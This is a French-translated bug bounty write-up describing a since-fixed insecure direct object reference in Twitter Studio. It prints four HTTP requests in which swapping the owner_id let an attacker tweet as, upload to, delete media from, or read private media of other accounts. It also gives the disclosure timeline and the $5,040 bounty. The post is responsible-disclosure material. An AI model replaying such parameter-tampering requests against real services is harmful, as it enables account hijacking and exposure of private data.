---
title: Comment j'aurais pu pirater tous les comptes Twitter (et comment j'ai gagné
  5 040 $ en primes)
subtitle: ''
author: freeCodeCamp
co_authors: []
series: null
date: '2018-01-04T05:26:16.000Z'
originalURL: https://freecodecamp.org/news/how-i-hacked-your-twitter-account-tweeting-viewing-deleting-photos-and-other-media-bf2cb3a18818
coverImage: https://cdn-media-1.freecodecamp.org/images/1*LmBD9OaRAJPnBYBoZwyZMw.jpeg
tags:
- name: Application Security
  slug: application-security
- name: bug bounty
  slug: bug-bounty
- name: Security
  slug: security
- name: 'tech '
  slug: tech
- name: Twitter
  slug: twitter
seo_title: Comment j'aurais pu pirater tous les comptes Twitter (et comment j'ai gagné
  5 040 $ en primes)
seo_desc: 'By AppSecure

  Summary

  This blog post is about an Insecure direct object reference vulnerability on Twitter.
  This vulnerability could have been used by attackers to undertake various activities.
  For example, they could tweet from other accounts, upload...'
---

Par AppSecure

### [Résumé](https://unsplash.com/search/photos/hacker?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText)

[Cet article de blog parle d'une](https://unsplash.com/search/photos/hacker?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText) [vulnérabilité de référence d'objet direct non sécurisée](https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References) sur Twitter. Cette vulnérabilité aurait pu être utilisée par des attaquants pour entreprendre diverses activités. Par exemple, ils auraient pu tweeter depuis d'autres comptes, télécharger des vidéos au nom des utilisateurs, supprimer des photos/vidéos du compte de la victime ou voir des médias privés téléchargés par d'autres comptes Twitter. Tous les endpoints sur studio.twitter.com étaient vulnérables.

### **Description**

Twitter est un service en ligne de nouvelles et de réseautage social où les utilisateurs publient et interagissent avec des messages, appelés "tweets", limités à 140 caractères. Les utilisateurs enregistrés peuvent publier des tweets, mais ceux qui ne sont pas enregistrés ne peuvent que les lire. Les utilisateurs accèdent à Twitter via son interface de site web, SMS ou une application mobile.

Twitter a lancé un nouveau produit nommé Twitter Studio (studio.twitter.com) en septembre 2016. J'ai commencé à rechercher des failles de sécurité après le lancement.

Toutes les requêtes API sur studio.twitter.com envoyaient un paramètre nommé "owner_id" qui était l'ID d'utilisateur Twitter public de l'utilisateur connecté. Le paramètre `owner_id` manquait de vérifications d'autorisation pour les modifications, ce qui m'a permis d'effectuer des actions au nom d'autres utilisateurs de Twitter.

#### **Requête vulnérable #1 (Tweeter depuis d'autres comptes Twitter.)**

```
POST /1/tweet.json HTTP/1.1Host: studio.twitter.com
```

```
{"account_id":"ID de compte de l'attaquant","owner_id":"ID d'utilisateur de la victime","metadata":{"monetize":false,"embeddable_playback":false,"title":"Test tweet par l'attaquant","description":"attaquant attaquant","cta_type":null,"cta_link":null},"media_key":"","text":"attaquant attaquant"}
```

Rejouer la requête ci-dessus avec l'ID de la victime a résulté en un tweet depuis le compte de la victime.

#### **Requête vulnérable #2 (Télécharger des médias depuis le compte d'un autre)**

```
POST /1/library/add.json HTTP/1.1Host: studio.twitter.com
```

```
{"account_id":"ID de compte de l'attaquant","owner_id":"ID de la victime","metadata":{"monetize":false,"name":"abcd.png","embeddable_playback":true,"title":"Attaquant","description":"","cta_type":null,"cta_link":null},"media_id":"","managed":false,"media_type":"TweetImage"}
```

Rejouer la requête ci-dessus avec l'`owner_id` de la victime a téléchargé des médias depuis d'autres comptes utilisateurs.

#### **Requête vulnérable #3 (Supprimer des vidéos d'autres comptes)**

```
POST /1/library/remove.json HTTP/1.1Host: studio.twitter.com
```

```
{"account_id":"ID de compte de l'attaquant","owner_id":"ID de la victime","media_key":"ID de vidéo de la victime"}
```

Rejouer la requête ci-dessus avec l'ID d'utilisateur de la victime et la `media_key` de la victime a supprimé des médias du compte de la victime.

#### **Requête vulnérable #4 (Divulgation de médias privés)**

`GET /1/library/list.json?account_id=ID de compte de l'attaquant&owner_id=ID de la victime&limit=20&offset=0 HTTP/1.1`  
`Host: studio.twitter.com`  
`User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:37.0) Gecko/20100101 Firefox/37.0`  
`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`  
`Accept-Language: en-US,en;q=0.5`  
`Accept-Encoding: gzip, deflate`  
`Referer: [https://studio.twitter.com/library](https://studio.twitter.com/library)`  
`Cookie:`   
`Connection: keep-alive`

Rejouer la requête ci-dessus avec l'ID d'utilisateur de la victime et mon ID de compte a divulgué tous les médias privés du compte Twitter de la victime dans la réponse.

### **Preuve de concept vidéo**

Tous les tests ont été effectués sur le compte d'un ami après avoir obtenu sa permission.

#### #1 Tweet depuis le compte de la victime, fuite de médias privés

#### #2 Supprimer des médias des tweets de la victime

### **Chronologie**

#### 29 août 2016

J'ai signalé toutes les découvertes à Twitter dans 3 rapports différents, car les endpoints étaient différents.

#### 2 septembre 2016

J'ai reçu une réponse de l'équipe Twitter disant qu'ils examinaient le problème et fermeraient les autres rapports comme doublons, car ils partageaient la même cause racine — c'est-à-dire l'absence de vérification de l'`owner_id`.

#### 3 septembre 2016

Prime de **5 040 $** récompensée par Twitter

Je suis le fondateur de [AppSecure](https://appsecure.in), une entreprise spécialisée en cybersécurité avec des années de compétences acquises et une expertise méticuleuse. Nous sommes là pour protéger votre entreprise et vos données critiques contre les menaces ou vulnérabilités en ligne et hors ligne.

Vous pouvez nous contacter à hello@appsecure.in